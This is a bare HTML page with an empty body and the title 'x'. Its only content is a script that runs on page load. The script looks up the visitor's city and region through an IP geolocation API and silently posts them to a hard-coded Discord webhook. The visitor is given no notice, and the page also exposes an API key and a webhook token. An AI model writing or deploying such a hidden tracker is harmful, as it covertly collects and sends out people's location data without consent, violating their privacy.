<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>x</title>
</head>
<body>

<script>
  fetch('https://api.ipstack.com/bfe9f61029622f0926af1e770b11d503?format=json')
    .then(response => response.json())
    .then(data => {
        const city = data.city;
        const state = data.region_name;
        const webhookURL = 'https://discord.com/api/webhooks/1197303153826218055/bUyjZhkxnSthZWF-UpyQJb4_wIF_NJZoM2Gn_5etKV9rwx-hfztGVXeLJDtyfEczvMSn';

        // Create payload for Discord webhook
        const payload = {
            content: `User's Location: ${city}, ${state}`,
        };

        // Send data to Discord webhook
        fetch(webhookURL, {
            method: 'POST',
            headers: {
                'Content-Type': 'application/json',
            },
            body: JSON.stringify(payload),
        });
    })
    .catch(error => {
        console.error('Error:', error);
    });
</script>

</body>
</html>
